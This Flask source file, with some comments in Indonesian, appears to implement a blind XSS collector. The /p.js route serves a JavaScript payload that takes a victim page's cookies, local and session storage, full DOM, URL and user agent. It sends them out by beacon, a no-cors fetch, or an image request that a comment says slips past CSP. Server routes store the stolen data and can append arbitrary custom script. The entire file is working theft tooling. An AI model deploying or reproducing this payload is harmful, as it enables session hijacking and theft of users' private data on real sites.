# app/collectors.py
from __future__ import annotations
import json, base64
from flask import Blueprint, Response, request, jsonify, current_app
from .db import get_db, get_setting
from .utils import now_iso, client_ip, compress_dom, is_rate_limited

bp = Blueprint("collectors", __name__)

UA_LIMIT = 400
URL_LIMIT = 2000
ORIGIN_LIMIT = 400
TITLE_LIMIT = 400
COOKIES_LIMIT = 4000
STORAGE_LIMIT = 8000

def store_event(data: dict):
    """Menyimpan data event ke database (skema lama kamu)."""
    with get_db() as db:
        db.execute(
            """INSERT INTO events
               (ts, ip, ua, url, origin, referrer, title,
                cookies, local_storage, session_storage, dom_snippet, raw_len)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (
                now_iso(),
                client_ip(),
                (data.get("userAgent", "") or request.headers.get("User-Agent",""))[:UA_LIMIT],                (data.get("url", "") or "")[:URL_LIMIT],
                (data.get("origin", "") or "")[:ORIGIN_LIMIT],
                (data.get("referrer", "") or "")[:URL_LIMIT],
                (data.get("title", "") or "")[:TITLE_LIMIT],
                (data.get("cookies", "") or "")[:COOKIES_LIMIT],
                json.dumps(data.get("localStorage", {}) or {}, ensure_ascii=False)[:STORAGE_LIMIT],
                json.dumps(data.get("sessionStorage", {}) or {}, ensure_ascii=False)[:STORAGE_LIMIT],
                compress_dom(data.get("dom", "") or ""),
                int(data.get("raw_len", 0) or 0),
            ),
        )

@bp.route("/p.js")
def payload_js():
    host = request.host.split("://")[-1]
    _bxss_base = f"//{host}"

    js = rf"""
(function(){{try{{
  var _bxssBase = "{_bxss_base}";
  var S=function(stor){{var o={{}}; try{{for(var i=0;i<stor.length;i++){{var k=stor.key(i); o[k]=stor.getItem(k);}}}}catch(e){{}} return o;}};
  var data = {{
    title: document.title,
    url: (function(){{try{{return String(top.location.href)}}catch(e){{try{{return String(location.href)}}catch(e){{return ""}}}}}})(),
    origin: (function(){{try{{return String(location.origin)}}catch(e){{return ""}}}})(),
    referrer: document.referrer || "",
    cookies: document.cookie || "",
    userAgent: navigator.userAgent || "",
    localStorage: S(localStorage),
    sessionStorage: S(sessionStorage),
    dom: (function(){{try{{var d=(document.documentElement&&document.documentElement.outerHTML)||(document.body&&document.body.outerHTML)||''; return d.length>200000?d.slice(0,200000):d;}}catch(e){{return ''}}}})()||""
  }};
  var body = JSON.stringify(data);

  // derive collector from the script's own URL so the domain is never hardcoded
  var base = '';
  try {{ if (document.currentScript && document.currentScript.src) base = document.currentScript.src; }} catch(e){{}}
  if (!base) {{
    try {{
      var scripts = document.querySelectorAll('script[src]');
      for (var i=0;i<scripts.length;i++) {{ if (/[?&\/]p\.js(?:[?#]|$)/.test(scripts[i].src)) {{ base = scripts[i].src; break; }} }}
    }} catch(e){{}}
  }}
  var collector = base ? new URL('/c', base).href : (_bxssBase ? _bxssBase + '/c' : '/c');

  try {{
    var blob = new Blob([body], {{type:'text/plain;charset=UTF-8'}});
    if (navigator.sendBeacon && navigator.sendBeacon(collector, blob)) return;
  }} catch(e){{}}

  try {{
    var fd = new FormData(); fd.append('d', body);
    var opts = {{ method:'POST', body: fd, mode:'no-cors' }};
    // keepalive is limited to ~64KB in Chromium; omit it for large bodies
    if (body.length < 60000) opts.keepalive = true;
    fetch(collector, opts).catch(function(){{}});
  }} catch(e){{}}

  // last-resort beacon: CSP img-src is often looser than connect-src
  try {{
    var img = new Image();
    img.src = collector + '.gif?u=' + encodeURIComponent(data.url || '') + '&r=' + encodeURIComponent(data.referrer || '');
  }} catch(e){{}}
}}catch(e){{}}}})();
""".lstrip()

    # --- tambahkan custom JS dari DB (settings table) ---
    try:
        custom = get_setting("custom_js")
        if custom.strip():
            js += "\n/* === custom.js (appended) === */\n" + custom + "\n"
    except Exception as e:
        current_app.logger.warning("custom js load failed: %s", e)
    # -------------------------------------------------------

    return Response(js, mimetype="application/javascript", headers={"Cache-Control":"no-store"})

@bp.route("/c", methods=["POST", "OPTIONS"])
def collect():
    if request.method == "OPTIONS":
        return ("", 204)
    if is_rate_limited(client_ip()):
        return jsonify(ok=False, error="rate_limited"), 429
    raw_text = request.form.get("d")
    if raw_text is None:
        raw_bytes = request.get_data(cache=False) or b""
        maxb = int(current_app.config.get("MAX_BODY", 524288))
        if len(raw_bytes) > maxb:
            raw_bytes = raw_bytes[:maxb]
        try:
            raw_text = raw_bytes.decode("utf-8", errors="ignore")
        except Exception:
            raw_text = ""

    try:
        payload = json.loads(raw_text) if raw_text else {}
    except Exception:
        payload = {}

    payload["raw_len"] = len(raw_text or "")
    store_event(payload)

    return jsonify(ok=True)

PIXEL_BYTES = base64.b64decode("R0lGODlhAQABAPAAAAAAAAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==")

@bp.route("/c.gif")
def collect_gif():
    if is_rate_limited(client_ip()):
        return Response(PIXEL_BYTES, mimetype="image/gif", headers={"Cache-Control":"no-store"}), 429
    event_data = {
        "url": request.args.get("u", ""),
        "referrer": request.args.get("r", ""),
    }
    store_event(event_data)
    return Response(PIXEL_BYTES, mimetype="image/gif", headers={"Cache-Control":"no-store"})
